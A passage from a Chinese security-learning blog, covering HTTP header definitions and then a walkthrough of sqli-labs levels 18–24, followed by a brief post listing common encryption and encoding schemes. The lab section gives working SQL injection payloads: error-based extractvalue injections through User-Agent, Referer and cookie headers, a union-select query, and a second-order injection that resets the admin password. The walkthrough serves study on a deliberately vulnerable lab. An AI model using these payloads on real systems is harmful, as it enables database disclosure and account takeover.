内容回应先前请求该内容的那个用户）<br>no-cache：（可以缓存，但是只有在跟WEB服务器验证了其有效后，才能返回给客户端）<br>max-age：（本响应包含的对象的过期时间）<br>ALL:no-store（不允许缓存）</p><p><strong>9.Connection:</strong></p><p>请求：</p><p>close：（告诉WEB服务器或者代理服务器，在完成本次请求的响应后，断开连接，不要等待本次连接的后续请求了）</p><p>keepalive：（告诉WEB服务器或者代理服务器，在完成本次请求的响应后，保持连接，等待本次连接的后续请求）</p><p>响应：</p><p>close：（连接已经关闭）</p><p>keepalive：（连接保持着，在等待本次连接的后续请求）</p><p>Keep-Alive：（如果浏览器请求保持连接，则该头部表明希望WEB服务器保持连接多长时间<br>（秒）。例如：Keep-Alive：300）</p><p><strong>10.Content-Encoding：</strong></p><p>WEB服务器表明自己使用了什么压缩方法（gzip，deflate）压缩响应中的对象。例如：Content-Encoding：gzip</p><p><strong>11.Content-Language:</strong></p><p>WEB服务器告诉浏览器自己响应的对象的语言。</p><p><strong>12.Content-Length:</strong></p><p>WEB服务器告诉浏览器自己响应的对象的长度。例如：Content-Length:26012</p><p><strong>13.Content-Range:</strong></p><p>WEB服务器表明该响应包含的部分对象为整个对象的哪个部分。例如：Content-Range:bytes21010-47021/47022</p><p><strong>14.Content-Type:</strong></p><p>WEB服务器告诉浏览器自己响应的对象的类型。例如：Content-Type：application/xml</p><p><strong>15.ETag:</strong></p><p>就是一个对象（比如URL）的标志值，就一个对象而言，比如一个html文件，如果被修改了，其Etag也会别修改，所以ETag的作用跟Last-Modified的作用差不多，主要供WEB服务器判断一个对象是否改变了。比如前一次请求某个html文件时，获得了其ETag，当这次又请求这个文件时，浏览器就会把先前获得的ETag值发送给WEB服务器，然后WEB服务器会把这个ETag跟该文件的当前ETag进行对比，然后就知道这个文件有没有改变了。</p><p><strong>16.Expired:</strong></p><p>WEB服务器表明该实体将在什么时候过期，对于过期了的对象，只有在跟WEB服务器验证了其有效性后，才能用来响应客户请求。是HTTP/1.0的头部。例如：Expires：Sat,23May200910:02:12GMT。</p><p><strong>17.Host:</strong></p><p>客户端指定自己想访问的WEB服务器的域名/IP地址和端口号。例如：Host：rss.sina.com.cn。</p><p><strong>18.if-Match:</strong></p><p>如果对象的ETag没有改变，其实也就意味著对象没有改变，才执行请求的动作。</p><p><strong>19.If-None-Match</strong></p><p>如果对象的ETag改变了，其实也就意味著对象也改变了，才执行请求的动作。</p><p><strong>20.If-Modified-Since:</strong></p><p>如果请求的对象在该头部指定的时间之后修改了，才执行请求的动作（比如返回对象），否则返回代码304，告诉浏览器该对象没有修改。例如：If-Modified-Since：Thu,10Apr200809:14:42GMT.</p><p><strong>21.If-Unmodified-Since:</strong></p><p>如果请求的对象在该头部指定的时间之后没修改过，才执行请求的动作（比如返回对象）。</p><p><strong>22.If-Range:</strong></p><p>浏览器告诉WEB服务器，如果我请求的对象没有改变，就把我缺少的部分给我，如果对象改变了，就把整个对象给我。浏览器通过发送请求对象的ETag或者自己所知道的最后修改时间给WEB服务器，让其判断对象是否改变了。总是跟Range头部一起使用。</p><p><strong>23.Last-Modified:</strong></p><p>WEB服务器认为对象的最后修改时间，比如文件的最后修改时间，动态页面的最后产生时间等等。例如：Last-Modified：Tue,06May200802:42:43GMT。</p><p><strong>24.Location</strong></p><p>WEB服务器告诉浏览器，试图访问的对象已经被移到别的位置了，到该头部 指 定 的 位 置 去 取 。 例 如 ：Location：<a target="_blank" rel="noopener" href="http://i0.sinaimg.cn/dy/deco/2008/0528/sinahome_0803_ws_005_text_0.gif">http://i0.sinaimg.cn/dy/deco/2008/0528/sinahome_0803_ws_005_text_0.gif</a></p><p><strong>25.Pramga:</strong></p><p>主要使用Pramga:no-cache，相当于Cache-Control：no-cache。例如：Pragma：no-cache</p><p><strong>26.Proxy-Authenticate：</strong></p><p>代理服务器响应浏览器，要求其提供代理身份验证信息。Proxy-Authorization：浏览器响应代理服务器的身份验证请求，提供自己的身份信息。</p><p><strong>27.Range：</strong></p><p>浏览器（比如Flashget多线程下载时）告诉WEB服务器自己想取对象的哪部分。例如：Range:bytes=1173546-</p><p><strong>28.Referer:</strong></p><p>浏览器向WEB服务器表明自己是从哪个网页/URL获得/点击当前请求中的网址/URL。例如：Referer：<a target="_blank" rel="noopener" href="http://www.sina.com/">http://www.sina.com/</a></p><p><strong>29.Server:</strong></p><p>WEB服务器表明自己是什么软件及版本等信息。例如：Server：Apache/2.0.61(Unix)</p><p><strong>30.User-Agent:</strong></p><p>浏览器表明自己的身份（是哪种浏览器）。例如：User-Agent：Mozilla/5.0<br>(Windows;U;WindowsNT5.1;zh-CN;rv:1.8.1.14)Gecko/20080404Firefox/2、0、0、14</p><p><strong>31.Transfer-Encoding:</strong></p><p>WEB服务器表明自己对本响应消息体（不是消息体里面的对象）作了怎样的编码，比如是否分块（chunked）。例如：Transfer-Encoding:chunked</p><p><strong>32.Vary:</strong></p><p>WEB服务器用该头部的内容告诉Cache服务器，在什么条件下才能用本响应所返回的对象响应后续的请求。假如源WEB服务器在接到第一个请求消息时，其响应消息的头部为：Content-Encoding:gzip;Vary:Content-Encoding那么Cache服务器会分析后续请求消息的头部，检查其Accept-Encoding，是否跟先前响应的Vary头部值一致，即是否使用相同的内容编码方法，这样就可以防止Cache服务器用自己Cache里面压缩后的实体响应给不具备解压能力的浏览器。例如：Vary：Accept-Encoding。</p><p><strong>33.Via：</strong></p><p>列出从客户端到OCS或者相反方向的响应经过了哪些代理服务器，他们用什么协议（和版本）发送的请求。当客户端请求到达第一个代理服务器时，该服务器会在自己发出的请求里面添加Via头部，并填上自己的相关信息，当下一个代理服务器收到第一个代理服务器的请求时，会在自己发出的请求里面复制前一个代理服务器的请求的Via头部，并把自己的相关信息加到后面，以此类推，当OCS收到最后一个代理服务器的请求时，检查Via头部，就知道该请求所经过的路由。例如：Via：1.0236.D0707195.sina.com.cn:80(squid/2.6.STABLE13)</p><h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p>从源码中我们可以看到，对用POST提交的Username和Password都进行了类似魔术引号的处理，因此我们在用户名和密码的输入框上进行注入是行不通的。</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image25.png" alt="image25"></p><p>这关我们输入正确的用户名和密码，发现有返回我们本机的信息，我们再看源码，发现确实是有insert函数来提交我们本机信息。</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image26.png" alt="image26"></p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image27.png" alt="image27"></p><p>上面的insert函数有将我们本机的useragent和IP插入到数据库中，于是我们可以通过抓包来修改useragent和Ip来进行注入。由于ip地址在这里修改会比较麻烦，于是我们来修改useragent。</p><p>比如我抓到包并将user-agent修改为dddd，那么登陆成功后弹出提示就是dddd。</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image28.png" alt="image28"></p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image29.png" alt="image29"></p><p>这样的话我们可以将dddd修改为一条注入语句，比如</p><p><code>&#39;and extractvalue(1,concat(0x7e,(select@@version),0x7e)) and&#39;1&#39;=&#39;1</code></p><p>这里为了看的更加明显，我把这条insert语句输出在屏幕上。</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image30.png" alt="image30"></p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image31.png" alt="image31"></p><p>对于这条语句<code>&#39;and extractvalue(1,concat(0x7e,(select@@version),0x7e)) and&#39;1&#39;=&#39;1</code></p><p>前面的’是为了闭合’$uagent’最前面的’，但是后面还有个’，于是我们用一个判断式子’1’=’1来闭合掉后面的’，最终的insert语句是这样的。</p><p><code>INSERT INTO security.uagents (uagent, ip_address, username) VALUES (&#39;&#39;and extractvalue(1,concat(0x7e,(select@@version),0x7e)) and&#39;1&#39;=&#39;1&#39;, &#39;192.168.176.1&#39;, &#39;admin&#39;)</code></p><p>并且爆出了版本号。其余的操作不加演示。</p><h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>本关同上一关，输入用户名和密码后发现有返回HTTP REFERER值</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image32.png" alt="image32"></p><p>因此抓包并在REFERER处注入</p><p><code>&#39;and extractvalue(1,concat(0x7e,(select@@basedir),0x7e)) and&#39;1&#39;=&#39;1</code></p><p>返回有当前目录信息</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image33.png" alt="image33"></p><h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><p>分析源码得知，cookie是从username中获取的，然后后台会从数据库中查询cookie值</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image34.png" alt="image34"></p><p>利用浏览器抓包修改cookie值为</p><p><code>uname=admin1&#39;andextractvalue(1,concat(0x7e,(select@@basedir),0x7e))#</code></p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image35.png" alt="image35"></p><h2 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h2><p>本关对cookie进行了base64处理，其他流程与上一关相同</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image36.png" alt="image36"></p><p>对上一关的payload使用base64编码即可</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image37.png" alt="image37"></p><p>成功返回当前目录！</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image38.png" alt="image38"></p><h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><p>本关与前两关类似，只不过是先对uname进行了base64编码处理</p><p>构造payload为<code>admin1&quot;and extractvalue(1,concat(0x7e,(select@@basedir),0x7e))#</code></p><p>采用base64编码处理</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image39.png" alt="image39"></p><p>修改cookie发送，成功！</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image40.png" alt="image40"></p><h2 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h2><p>从首页我们可以推测出此处的sql语句为<code>select * from users where id=&#39;$id&#39; limit 0,1;</code>，事实上也确实如此</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image41.png" alt="image41"></p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/Users\朱易明\AppData\Roaming\Typora\typora-user-images\image-20220227151854725.png" alt="image-20220227151854725"></p><p>此处可以构造payload为<code>-1&#39; union select 1,@@datadir,&#39;3</code></p><p><strong>注意：</strong></p><ul><li>id=-1是使前面没有意义的查询不显示，只显示出自己想要查询的信息；</li><li>第一个单引号闭合-1，第二个单引号闭合后面的3</li></ul><p>此时sql语句为<code>select * from users where id=&#39;-1&#39; union select 1,@@datadir,&#39;3&#39; limit 0,1</code></p><p>成功爆出目录！</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image42.png" alt="image42"></p><h2 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h2><p>本关为二次排序注入的示范例。二次排序注入也成为存储型的注入，就是将可能导致<br>sql注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以触发sql注入。<br>二次排序注入思路：</p><p>1.黑客通过构造数据的形式，在浏览器或者其他软件中提交HTTP数据报文请求到服务<br>端进行处理，提交的数据报文请求中可能包含了黑客构造的SQL语句或者命令。</p><p>2.服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的<br>数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响<br>应。</p><p>3.黑客向服务端发送第二个与第一次不相同的请求数据信息。</p><p>4.服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库<br>中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的SQL语句或者命令在服<br>务端环境中执行。</p><p>5.服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注<br>入漏洞利用是否成功。</p><p>本关举例的步骤是先注册一个admin’#的账号，接下来登录这个账号后进行修改密码。此时修改的就是admin的密码。</p><p>此时修改的sql语句为</p><p><code>update users set passwd=&quot;New_Pass&quot; where username=&#39;admin&#39; # &#39;and password=&#39;</code></p><p>#把后面的语句给注释掉了，因此修改的就是用户admin的密码。</p><p><strong>步骤演示：</strong></p><ul><li>初始数据库为</li></ul><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image43.png" alt="image43"></p><ul><li>登录admin’#，并修改密码</li></ul><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image44.png" alt="image44"></p><ul><li>发现用户admin密码修改了</li></ul><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image45.png" alt="image45"></p><h2 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h2><p>待更！</p></div><footer class="post-footer"><div class="post-eof"></div></footer></article><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.zymstudy.club/2021/11/26/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/Panda.jpg"><meta itemprop="name" content="zym"><meta itemprop="description" content="生活日常随笔"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="猪哥的博客"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/2021/11/26/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/" class="post-title-link" itemprop="url">基础入门——加密编码算法</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2021-11-26 21:34:17 / 修改时间：21:46:58" itemprop="dateCreated datePublished" datetime="2021-11-26T21:34:17+08:00">2021-11-26</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">小迪安全学习笔记</span></a> </span></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i> </span><span class="post-meta-item-text">Valine：</span> <a title="valine" href="/2021/11/26/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/#valine-comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2021/11/26/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>176</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>1 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><h1 id="06-基础入门——加密编码算法"><a href="#06-基础入门——加密编码算法" class="headerlink" title="06 基础入门——加密编码算法"></a>06 基础入门——加密编码算法</h1><h3 id="常见加密编码等算法解析"><a href="#常见加密编码等算法解析" class="headerlink" title="常见加密编码等算法解析"></a><strong>常见加密编码等算法解析</strong></h3><p>MD5，SHA,，ASC,进制，时间戳，URL， BASE64， Unescape, AES, DES等</p><h3 id="常见加密形式算法解析"><a href="#常见加密形式算法解析" class="headerlink" title="常见加密形式算法解析"></a>常见加密形式算法解析</h3><p>直接加密，带salt, 带密码，带偏移，带位数，带模式，带干扰，自定义组合等</p><h3 id="常见解密方式-针对"><a href="#常见解密方式-针对" class="headerlink" title="常见解密方式(针对)"></a>常见解密方式(针对)</h3><p>枚举，自定义逆向算法，可逆向.</p><h3 id="了解常规加密算法的特性"><a href="#了解常规加密算法的特性" class="headerlink" title="了解常规加密算法的特性"></a>了解常规加密算法的特性</h3><p>长度位数，字符规律，代码分析，搜索获取等</p></div><footer class="post-footer"><div class="post-eof"></div></footer></article><nav class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a></nav></div><script>window.addEventListener("tabs:register",()=>{let e=CONFIG.comments["activeClass"];if(CONFIG.comments.storage&&(e=localStorage.getItem("comments_active")||e),e){let t=document.querySelector(`a[href="#comment-${e}"]`);t&&t.click()}}),CONFIG.comments.storage&&window.addEventListener("tabs:click",t=>{t.target.matches(".tabs-comment .tab-content .tab-pane")&&(t=t.target.classList[1],localStorage.setItem("comments_active",t))})</script></div><div class="toggle sidebar-toggle"><span class="toggle-line toggle-line-first"></span> <span class="toggle-line toggle-line-middle"></span> <span class="toggle-line toggle-line-last"></span></div><aside class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc">文章目录</li><li class="sidebar-nav-overview">站点概览</li></ul><div class="post-toc-wrap sidebar-panel"></div><div class="site-overview-wrap sidebar-panel"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" alt="zym" src="/images/Panda.jpg"><p class="site-author-name" itemprop="name">zym</p><div class="site-description" itemprop="description">生活日常随笔</div></div><div class="site-state-wrap motion-element"><nav class="site-state"><div class="site-state-item site-state-posts"><a href="/archives/"><span class="site-state-item-count">31</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"><a href="/categories/"><span class="site-state-item-count">5</span> <span class="site-state-item-name">分类</span></a></div><div class="site-state-item site-state-tags"><a href="/tags/"><span class="site-state-item-count">17</span> <span class="site-state-item-name">标签</span></a></div></nav></div><div class="links-of-author motion-element"><span class="links-of-author-item"><a href="https://github.com/zym1290190720" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;zym1290190720" rel="noopener" target="_blank"><i class="github fa-fw"></i>GitHub</a> </span><span class="links-of-author-item"><a href="https://space.bilibili.com/102399257" title="哔哩哔哩 → https:&#x2F;&#x2F;space.bilibili.com&#x2F;102399257" rel="noopener" target="_blank"><i class="fa fa-bilibili fa-fw"></i>哔哩哔哩</a> </span><span class="links-of-author-item"><a href="/1290190720@qq.com" title="E-Mail → 1290190720@qq.com"><i class="fa fa-email fa-fw"></i>E-Mail</a></span></div></div><div class="back-to-top motion-element"><i class="fa fa-arrow-up"></i> <span>0%</span></div><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="450" src="//music.163.com/outchain/player?type=0&id=7031295547&auto=1&height=430"></iframe></div></aside><div id="sidebar-dimmer"></div></div></main><footer class="footer"><div class="footer-inner"><div class="copyright">&copy; <span itemprop="copyrightYear">2022</span> <span class="with-love"><i class="fa fa-heart"></i> </span><span class="author" itemprop="copyrightHolder">zym</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-chart-area"></i> </span><span class="post-meta-item-text">站点总字数：</span> <span title="站点总字数">91k</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-coffee"></i> </span><span class="post-meta-item-text">站点阅读时长 &asymp;</span> <span title="站点阅读时长">1:23</span></div><span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span><script>var now=new Date;function createtime(){var n=new Date("10/20/2021 17:38:00");now.setTime(now.getTime()+250),days=(now-n)/1e3/60/60/24,dnum=Math.floor(days),hours=(now-n)/1e3/60/60-24*dnum,hnum=Math.floor(hours),1==String(hnum).length&&(hnum="0"+hnum),minutes=(now-n)/1e3/60-1440*dnum-60*hnum,mnum=Math.floor(minutes),1==String(mnum).length&&(mnum="0"+mnum),seconds=(now-n)/1e3-86400*dnum-3600*hnum-60*mnum,snum=Math.round(seconds),1==String(snum).length&&(snum="0"+snum),document.getElementById("timeDate").innerHTML="本站已运行 "+dnum+" 天 ",document.getElementById("times").innerHTML=hnum+" 小时 "+mnum+" 分 "+snum+" 秒"}setInterval("createtime()",250)</script><div class="busuanzi-count"><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span class="post-meta-item" id="busuanzi_container_site_uv" style="display:none"><span class="post-meta-item-icon"><i class="user"></i> </span><span class="site-uv" title="总访客量"><span id="busuanzi_value_site_uv"></span> </span></span><span class="post-meta-divider">|</span> <span class="post-meta-item" id="busuanzi_container_site_pv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-eye"></i> </span><span class="site-pv" title="总访问量"><span id="busuanzi_value_site_pv"></span></span></span></div></div></footer></div><script color="" opacity="" zindex="" count="" src="/lib/canvas-nest/canvas-nest-nomobile.min.js"></script><script src="/lib/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script><script src="/lib/velocity/velocity.min.js"></script><script src="/lib/velocity/velocity.ui.min.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/pisces.js"></script><script src="/js/next-boot.js"></script><script>!function(){var e,t,o,n,r=document.getElementsByTagName("link");if(0<r.length)for(i=0;i<r.length;i++)"canonical"==r[i].rel.toLowerCase()&&r[i].href&&(e=r[i].href);t=(e||window.location.protocol).split(":")[0],e=e||window.location.href,window,o=e,n=document.referrer,/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi.test(o)||(t="https"===String(t).toLowerCase()?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif",n?(t+="?r="+encodeURIComponent(document.referrer),o&&(t+="&l="+o)):o&&(t+="?l="+o),(new Image).src=t)}()</script><script src="/js/local-search.js"></script><script>NexT.utils.loadComments(document.querySelector("#valine-comments"),()=>{NexT.utils.getScript("//unpkg.com/valine/dist/Valine.min.js",()=>{var i=["nick","mail","link"],e="nick,mail,link".split(",").filter(e=>i.includes(e));new Valine({el:"#valine-comments",verify:!1,notify:!1,appId:"7p2LmPjyfCosM5SP4z3ebEAM-gzGzoHsz",appKey:"eeaup3Y0KIEkbiXMdTna4Hgy",placeholder:"留下你的足迹吧",avatar:"mm",meta:e,pageSize:"10",visitor:!1,lang:"zh-cn",path:location.pathname,recordIP:!1,serverURLs:""})},window.Valine)})</script><！ - 页面点击小红心 - ><script type="text/javascript" src="/js/love-click.js"></script></body></html>